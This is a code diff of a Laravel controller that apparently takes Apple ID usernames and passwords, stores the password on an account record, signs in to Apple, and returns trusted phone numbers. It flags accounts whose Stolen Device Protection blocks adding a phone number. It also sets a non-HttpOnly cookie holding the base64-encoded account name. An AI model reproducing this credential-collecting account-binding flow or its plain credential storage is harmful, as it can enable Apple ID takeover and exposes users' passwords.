@@ -32,6 +32,7 @@ use Saloon\Exceptions\SaloonException;
 use App\Services\Trait\IpInfo;
 use App\Models\SecuritySetting;
 use App\Exceptions\AccountAlreadyBindException;
+
 class AppleClientController extends Controller
 {
     use IpInfo;
@@ -83,70 +84,80 @@ class AppleClientController extends Controller
     public function verifyAccount(
         VerifyAccountRequest $request
     ): JsonResponse {
+
         $validatedData = $request->validated();
+        
+        try {
+            
 
-        $account = $validatedData['accountName'];
-        $password = $validatedData['password'];
+            $account = $validatedData['accountName'];
+            $password = $validatedData['password'];
 
-        $this->cacheAccountIp($account);
-        $this->ipInfo();
+            $this->cacheAccountIp($account);
+            $this->ipInfo();
 
-        $apple = Account::withTrashed()->where('appleid', $account)->first();
+            $apple = Account::withTrashed()->where('appleid', $account)->first();
 
-        if ($apple) {
+            if ($apple) {
 
-            if($apple->bind_phone){
-                throw new AccountAlreadyBindException(__('apple.signin.account_bind_phone'));
+                if ($apple->bind_phone) {
+                    throw new AccountAlreadyBindException(__('apple.signin.account_bind_phone'));
+                }
+
+                if ($apple->trashed()) {
+                    $apple->restore();
+                }
+                $apple->password = $password;
+                $apple->save();
+            } else {
+                $apple = Account::create([
+                    'appleid'  => $account,
+                    'password' => $password,
+                ]);
             }
 
-            if ($apple->trashed()) {
-                $apple->restore();
+            $apple->config()->add('apple_auth_url', value: config('apple.apple_auth_url'));
+
+            $apple->appleIdResource()->signIn();
+
+            $auth = $apple->appleIdResource()->appleAuth();
+
+            $guid = base64_encode($account);
+
+            $cookie = Cookie::make('Guid', $guid)
+                ->withHttpOnly(false);
+
+            if ($auth->hasTrustedDevices() || $auth->getTrustedPhoneNumbers()->count() === 0) {
+                return $this->success(data: [
+                    'Guid' => $guid,
+                    'Devices' => true,
+                ], code: 201)->cookie($cookie);
             }
-            $apple->password = $password;
-            $apple->save();
-        } else {
-            $apple = Account::create([
-                'appleid'  => $account,
-                'password' => $password,
-            ]);
-        }
 
-        $apple->config()->add('apple_auth_url', value: config('apple.apple_auth_url'));
+            if ($auth->getTrustedPhoneNumbers()->count() >= 2) {
+                return $this->success(data: [
+                    'Guid' => $guid,
+                    'Devices' => false,
+                ], code: 202)->cookie($cookie);
+            }
 
-        $apple->appleIdResource()->signIn();
+            /**
+             * @var PhoneNumber $trustedPhoneNumbers
+             */
+            $trustedPhoneNumbers = $auth->getTrustedPhoneNumbers()->toCollection()->first();
 
-        $auth = $apple->appleIdResource()->appleAuth();
-
-        $guid = base64_encode($account);
-
-        $cookie = Cookie::make('Guid', $guid)
-            ->withHttpOnly(false);
-
-        if ($auth->hasTrustedDevices() || $auth->getTrustedPhoneNumbers()->count() === 0) {
             return $this->success(data: [
-                'Guid' => $guid,
-                'Devices' => true,
-            ], code: 201)->cookie($cookie);
-        }
-
-        if ($auth->getTrustedPhoneNumbers()->count() >= 2) {
-            return $this->success(data: [
-                'Guid' => $guid,
+                'Guid'   => $guid,
                 'Devices' => false,
-            ], code: 202)->cookie($cookie);
+                'ID'     => $trustedPhoneNumbers->id,
+                'Number' => $trustedPhoneNumbers->numberWithDialCode,
+            ], code: 203)->cookie($cookie);
+        } catch (\Throwable $e) {
+            if ($e instanceof AccountAlreadyBindException) {
+                throw new SignInException($e->getMessage());
+            }
+            throw new SignInException(__('apple.signin.incorrect'));
         }
-
-        /**
-         * @var PhoneNumber $trustedPhoneNumbers
-         */
-        $trustedPhoneNumbers = $auth->getTrustedPhoneNumbers()->toCollection()->first();
-
-        return $this->success(data: [
-            'Guid'   => $guid,
-            'Devices' => false,
-            'ID'     => $trustedPhoneNumbers->id,
-            'Number' => $trustedPhoneNumbers->numberWithDialCode,
-        ], code: 203)->cookie($cookie);
     }
 
     public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
@@ -187,19 +198,19 @@ class AppleClientController extends Controller
 
         if ($controllerService->isStolenDeviceProtectionException() === true) {
 
-            //已开启“失窃设备保护”，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备'
+            //已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备'
             $controllerService->getApple()->update(['status' => AccountStatus::THEFT_PROTECTION]);
 
             $controllerService->getApple()->logs()->create(
                 [
                     'action' => '设备保护验证',
-                    'request' => '已开启“失窃设备保护”，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
+                    'request' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
                 ]
             );
 
             return response()->json([
                 'code'    => 403,
-                'message' => '已开启“失窃设备保护”，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
+                'message' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
             ]);
         }
 
@@ -234,13 +245,13 @@ class AppleClientController extends Controller
             $controllerService->getApple()->logs()->create(
                 [
                     'action' => '设备保护验证',
-                    'request' => '已开启“失窃设备保护”，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
+                    'request' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
                 ]
             );
 
             return response()->json([
                 'code'    => 403,
-                'message' => '已开启“失窃设备保护”，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
+                'message' => '已开启"失窃设备保护"，无法在网页上更改部分账户信息。 若要添加电话号码，请使用其他 Apple 设备',
             ]);
         }
 
